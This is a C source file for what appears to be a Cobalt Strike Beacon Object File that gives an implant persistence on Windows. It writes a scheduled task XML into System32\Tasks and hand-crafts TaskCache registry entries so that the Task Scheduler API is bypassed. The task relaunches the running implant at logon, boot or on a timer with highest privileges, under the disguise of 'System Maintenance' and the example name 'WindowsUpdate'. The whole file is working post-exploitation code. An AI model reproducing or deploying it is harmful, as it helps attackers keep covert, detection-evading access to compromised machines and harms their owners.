/*
 * schtask_persist_reg.c - Scheduled Task persistence via direct registry write.
 *
 * Writes task XML to System32\Tasks\ and creates registry entries
 * in TaskCache directly. No Task Scheduler API (no COM, no schtasks.exe).
 * Requires Administrator/SYSTEM privileges.
 *
 * Activates on next Task Scheduler service restart (reboot).
 *
 * Args (single string via Beacon Data API):
 *   "<task_name> <schedule>"
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c schtask_persist_reg.c -o schtask_persist_reg.o
 */

#include <windows.h>
#include "beacon.h"

/* ── DLL Imports ── */
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetWindowsDirectoryA(LPSTR, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);

DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT long   WINAPI RPCRT4$UuidCreate(void*);

/* ── Constants ── */
#define BOF_HKLM            ((HKEY)(ULONG_PTR)0x80000002)
#define BOF_KEY_ALL_ACCESS  0xF003FL
#define BOF_REG_SZ          1
#define BOF_REG_DWORD       4

/* ── Helpers ── */
static void bof_memset(void* d, int v, unsigned long long n) {
    unsigned char* p = (unsigned char*)d; while (n--) *p++ = (unsigned char)v;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static char bof_upper(char c) { return (c >= 'a' && c <= 'z') ? c - 32 : c; }
static int bof_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

/* Append string, return new position */
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}

/* Integer to decimal */
static int bof_itoa(int val, char* buf) {
    if (val <= 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int i = 0;
    while (val > 0) { tmp[i++] = '0' + val % 10; val /= 10; }
    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}

/* Parse /MO <number> */
static int parse_mo(const char* s) {
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'M' && bof_upper(p[2]) == 'O' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            return v > 0 ? v : 1;
        }
    }
    return 1;
}

/* Parse /ST HH:MM */
static void parse_st(const char* s, int* hh, int* mm) {
    *hh = 0; *mm = 0;
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'S' && bof_upper(p[2]) == 'T' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            if (p[0] && p[1] && p[2] == ':' && p[3] && p[4]) {
                *hh = (p[0] - '0') * 10 + (p[1] - '0');
                *mm = (p[3] - '0') * 10 + (p[4] - '0');
            }
            return;
        }
    }
}

/* UUID struct */
typedef struct {
    unsigned long  d1;
    unsigned short d2, d3;
    unsigned char  d4[8];
} BOF_UUID;

/* Format GUID string: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} */
static int fmt_guid(char* buf, BOF_UUID* u) {
    const char hx[] = "0123456789abcdef";
    int p = 0;
    buf[p++] = '{';
    for (int i = 7; i >= 0; i--) buf[p++] = hx[(u->d1 >> (i*4)) & 0xF];
    buf[p++] = '-';
    for (int i = 3; i >= 0; i--) buf[p++] = hx[(u->d2 >> (i*4)) & 0xF];
    buf[p++] = '-';
    for (int i = 3; i >= 0; i--) buf[p++] = hx[(u->d3 >> (i*4)) & 0xF];
    buf[p++] = '-';
    buf[p++] = hx[u->d4[0]>>4]; buf[p++] = hx[u->d4[0]&0xF];
    buf[p++] = hx[u->d4[1]>>4]; buf[p++] = hx[u->d4[1]&0xF];
    buf[p++] = '-';
    for (int i = 2; i < 8; i++) { buf[p++] = hx[u->d4[i]>>4]; buf[p++] = hx[u->d4[i]&0xF]; }
    buf[p++] = '}';
    buf[p] = '\0';
    return p;
}

/* 2-digit zero-padded */
static int d2(char* b, int v) { b[0] = '0' + v / 10; b[1] = '0' + v % 10; return 2; }

/* ═══════════════════════════════════════════════════════════ */
void go(char* args, int alen)
{
    /* ── 1. Parse args ── */
    char* input = NULL;
    int input_len = 0;
    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    char raw[512];
    if (input_len >= (int)sizeof(raw)) input_len = sizeof(raw) - 1;
    bof_memcpy(raw, input, input_len);
    raw[input_len] = '\0';

    /* Split: task_name + schedule */
    char* sp = NULL;
    for (int i = 0; i < input_len; i++) {
        if (raw[i] == ' ') { sp = raw + i; break; }
    }
    if (!sp) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }
    *sp = '\0';
    char* task_name = raw;
    int tname_len = bof_strlen(task_name);
    char* schedule = sp + 1;
    while (*schedule == ' ') schedule++;
    if (!*schedule) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    /* Extract schedule type */
    char stype[16]; int si = 0;
    while (schedule[si] && schedule[si] != ' ' && si < 15) {
        stype[si] = bof_upper(schedule[si]); si++;
    }
    stype[si] = '\0';
    char* params = schedule + si;
    while (*params == ' ') params++;

    /* ── 2. Get exe path ── */
    char exe_path[512];
    DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (elen == 0 || elen >= sizeof(exe_path)) {
        BeaconOutput(CALLBACK_ERROR, "GetModuleFileName failed\n", 24);
        return;
    }
    exe_path[elen] = '\0';

    /* ── 3. Get windows directory ── */
    char windir[260];
    DWORD wdlen = KERNEL32$GetWindowsDirectoryA(windir, sizeof(windir));
    if (wdlen == 0) {
        BeaconOutput(CALLBACK_ERROR, "GetWindowsDirectory failed\n", 26);
        return;
    }

    /* ── 4. Get current time ── */
    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);

    /* ── 5. Build task XML ── */
    char xml[4096];
    int xp = 0;

    xp = sa(xml, xp, "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n");
    xp = sa(xml, xp, "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n");
    xp = sa(xml, xp, "  <RegistrationInfo>\r\n");
    xp = sa(xml, xp, "    <Description>System Maintenance</Description>\r\n");
    xp = sa(xml, xp, "    <Date>");
    /* YYYY-MM-DDTHH:MM:SS */
    xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
    xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
    xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
    xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
    xp += d2(xml + xp, st.wMinute); xml[xp++] = ':';
    xp += d2(xml + xp, st.wSecond);
    xp = sa(xml, xp, "</Date>\r\n");
    xp = sa(xml, xp, "  </RegistrationInfo>\r\n");

    /* Triggers */
    xp = sa(xml, xp, "  <Triggers>\r\n");
    if (bof_strcmp(stype, "ONLOGON") == 0) {
        xp = sa(xml, xp, "    <LogonTrigger>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </LogonTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONSTART") == 0) {
        xp = sa(xml, xp, "    <BootTrigger>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </BootTrigger>\r\n");
    } else if (bof_strcmp(stype, "MINUTE") == 0 || bof_strcmp(stype, "HOURLY") == 0 ||
               bof_strcmp(stype, "DAILY") == 0) {
        int mo = parse_mo(params);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n");
        xp = sa(xml, xp, "      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
        xp += d2(xml + xp, st.wMinute); xml[xp++] = ':';
        xp = sa(xml, xp, "00</StartBoundary>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "      <Repetition>\r\n");
        xp = sa(xml, xp, "        <Interval>P");
        if (bof_strcmp(stype, "DAILY") == 0) {
            xp += bof_itoa(mo, xml + xp);
            xml[xp++] = 'D';
        } else {
            xml[xp++] = 'T';
            xp += bof_itoa(mo, xml + xp);
            xml[xp++] = (bof_strcmp(stype, "HOURLY") == 0) ? 'H' : 'M';
        }
        xp = sa(xml, xp, "</Interval>\r\n");
        xp = sa(xml, xp, "        <Duration>P10000D</Duration>\r\n");
        xp = sa(xml, xp, "        <StopAtDurationEnd>false</StopAtDurationEnd>\r\n");
        xp = sa(xml, xp, "      </Repetition>\r\n");
        xp = sa(xml, xp, "    </TimeTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONCE") == 0) {
        int hh = 0, mm = 0;
        parse_st(params, &hh, &mm);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n");
        xp = sa(xml, xp, "      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, hh); xml[xp++] = ':';
        xp += d2(xml + xp, mm); xml[xp++] = ':';
        xp = sa(xml, xp, "00</StartBoundary>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </TimeTrigger>\r\n");
    } else {
        BeaconOutput(CALLBACK_ERROR,
            "Unknown schedule. Use: ONLOGON ONSTART MINUTE HOURLY DAILY ONCE\n", 64);
        return;
    }
    xp = sa(xml, xp, "  </Triggers>\r\n");

    /* Principals */
    xp = sa(xml, xp, "  <Principals>\r\n");
    xp = sa(xml, xp, "    <Principal id=\"Author\">\r\n");
    xp = sa(xml, xp, "      <RunLevel>HighestAvailable</RunLevel>\r\n");
    xp = sa(xml, xp, "    </Principal>\r\n");
    xp = sa(xml, xp, "  </Principals>\r\n");

    /* Settings */
    xp = sa(xml, xp, "  <Settings>\r\n");
    xp = sa(xml, xp, "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n");
    xp = sa(xml, xp, "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n");
    xp = sa(xml, xp, "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n");
    xp = sa(xml, xp, "    <AllowHardTerminate>true</AllowHardTerminate>\r\n");
    xp = sa(xml, xp, "    <StartWhenAvailable>true</StartWhenAvailable>\r\n");
    xp = sa(xml, xp, "    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n");
    xp = sa(xml, xp, "    <Enabled>true</Enabled>\r\n");
    xp = sa(xml, xp, "    <Hidden>false</Hidden>\r\n");
    xp = sa(xml, xp, "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n");
    xp = sa(xml, xp, "    <WakeToRun>false</WakeToRun>\r\n");
    xp = sa(xml, xp, "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n");
    xp = sa(xml, xp, "    <Priority>7</Priority>\r\n");
    xp = sa(xml, xp, "  </Settings>\r\n");

    /* Actions */
    xp = sa(xml, xp, "  <Actions Context=\"Author\">\r\n");
    xp = sa(xml, xp, "    <Exec>\r\n");
    xp = sa(xml, xp, "      <Command>");
    bof_memcpy(xml + xp, exe_path, elen); xp += elen;
    xp = sa(xml, xp, "</Command>\r\n");
    xp = sa(xml, xp, "    </Exec>\r\n");
    xp = sa(xml, xp, "  </Actions>\r\n");
    xp = sa(xml, xp, "</Task>\r\n");
    xml[xp] = '\0';

    /* ── 6. Convert XML to UTF-16LE ── */
    WCHAR wxml[4096];
    int wlen = KERNEL32$MultiByteToWideChar(0 /*CP_ACP*/, 0, xml, xp, wxml, 4096);
    if (wlen <= 0) {
        BeaconOutput(CALLBACK_ERROR, "XML UTF-16 conversion failed\n", 29);
        return;
    }

    /* ── 7. Build file path: <windir>\System32\Tasks\<name> ── */
    char fpath[768];
    int fp = 0;
    bof_memcpy(fpath + fp, windir, wdlen); fp += wdlen;
    fp = sa(fpath, fp, "\\System32\\Tasks\\");
    bof_memcpy(fpath + fp, task_name, tname_len); fp += tname_len;
    fpath[fp] = '\0';

    /* ── 8. Write XML file (UTF-16LE with BOM) ── */
    HANDLE hFile = KERNEL32$CreateFileA(fpath, 0x40000000L /*GENERIC_WRITE*/,
        0, NULL, 2 /*CREATE_ALWAYS*/, 0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconOutput(CALLBACK_ERROR, "CreateFile failed (need admin?)\n", 31);
        return;
    }
    DWORD written;
    /* Write BOM */
    unsigned char bom[2] = { 0xFF, 0xFE };
    KERNEL32$WriteFile(hFile, bom, 2, &written, NULL);
    /* Write UTF-16LE content */
    KERNEL32$WriteFile(hFile, wxml, wlen * 2, &written, NULL);
    KERNEL32$CloseHandle(hFile);

    /* ── 9. Generate GUID ── */
    BOF_UUID uuid;
    bof_memset(&uuid, 0, sizeof(uuid));
    RPCRT4$UuidCreate(&uuid);

    char guid[40];
    fmt_guid(guid, &uuid);
    int guid_len = bof_strlen(guid);

    /* ── 10. Create registry: TaskCache\Tree\<name> ── */
    char treeKey[512];
    int tp = 0;
    tp = sa(treeKey, tp, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\");
    bof_memcpy(treeKey + tp, task_name, tname_len); tp += tname_len;
    treeKey[tp] = '\0';

    HKEY hTree = NULL;
    LONG rc = ADVAPI32$RegCreateKeyExA(BOF_HKLM, treeKey, 0, NULL, 0,
        BOF_KEY_ALL_ACCESS, NULL, &hTree, NULL);
    if (rc != 0) {
        BeaconOutput(CALLBACK_ERROR, "RegCreateKey Tree failed (need SYSTEM?)\n", 40);
        return;
    }
    ADVAPI32$RegSetValueExA(hTree, "Id", 0, BOF_REG_SZ, (BYTE*)guid, guid_len + 1);
    DWORD idx = 0;
    ADVAPI32$RegSetValueExA(hTree, "Index", 0, BOF_REG_DWORD, (BYTE*)&idx, 4);
    ADVAPI32$RegCloseKey(hTree);

    /* ── 11. Create registry: TaskCache\Tasks\{GUID} ── */
    char taskKey[512];
    int tkp = 0;
    tkp = sa(taskKey, tkp, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\");
    bof_memcpy(taskKey + tkp, guid, guid_len); tkp += guid_len;
    taskKey[tkp] = '\0';

    HKEY hTask = NULL;
    rc = ADVAPI32$RegCreateKeyExA(BOF_HKLM, taskKey, 0, NULL, 0,
        BOF_KEY_ALL_ACCESS, NULL, &hTask, NULL);
    if (rc != 0) {
        BeaconOutput(CALLBACK_ERROR, "RegCreateKey Tasks failed\n", 26);
        return;
    }

    /* Path = \<name> */
    char pathVal[260];
    pathVal[0] = '\\';
    bof_memcpy(pathVal + 1, task_name, tname_len);
    pathVal[1 + tname_len] = '\0';
    ADVAPI32$RegSetValueExA(hTask, "Path", 0, BOF_REG_SZ, (BYTE*)pathVal, tname_len + 2);
    ADVAPI32$RegSetValueExA(hTask, "URI", 0, BOF_REG_SZ, (BYTE*)pathVal, tname_len + 2);

    /* Date */
    char dateBuf[24];
    int dp = 0;
    dp += bof_itoa(st.wYear, dateBuf + dp); dateBuf[dp++] = '-';
    dp += d2(dateBuf + dp, st.wMonth); dateBuf[dp++] = '-';
    dp += d2(dateBuf + dp, st.wDay); dateBuf[dp++] = 'T';
    dp += d2(dateBuf + dp, st.wHour); dateBuf[dp++] = ':';
    dp += d2(dateBuf + dp, st.wMinute); dateBuf[dp++] = ':';
    dp += d2(dateBuf + dp, st.wSecond);
    dateBuf[dp] = '\0';
    ADVAPI32$RegSetValueExA(hTask, "Date", 0, BOF_REG_SZ, (BYTE*)dateBuf, dp + 1);

    /* Schema */
    DWORD schema = 0x10004;
    ADVAPI32$RegSetValueExA(hTask, "Schema", 0, BOF_REG_DWORD, (BYTE*)&schema, 4);

    ADVAPI32$RegCloseKey(hTask);

    /* ── 12. Report ── */
    {
        char msg[768];
        int mp = 0;
        mp = sa(msg, mp, "[REG] Task XML written: ");
        bof_memcpy(msg + mp, fpath, fp); mp += fp;
        msg[mp++] = '\n';
        mp = sa(msg, mp, "[REG] TaskCache\\Tree\\");
        bof_memcpy(msg + mp, task_name, tname_len); mp += tname_len;
        mp = sa(msg, mp, " → ");
        bof_memcpy(msg + mp, guid, guid_len); mp += guid_len;
        msg[mp++] = '\n';
        mp = sa(msg, mp, "[REG] Activates on next reboot / service restart\n");
        BeaconOutput(CALLBACK_OUTPUT, msg, mp);
    }
}
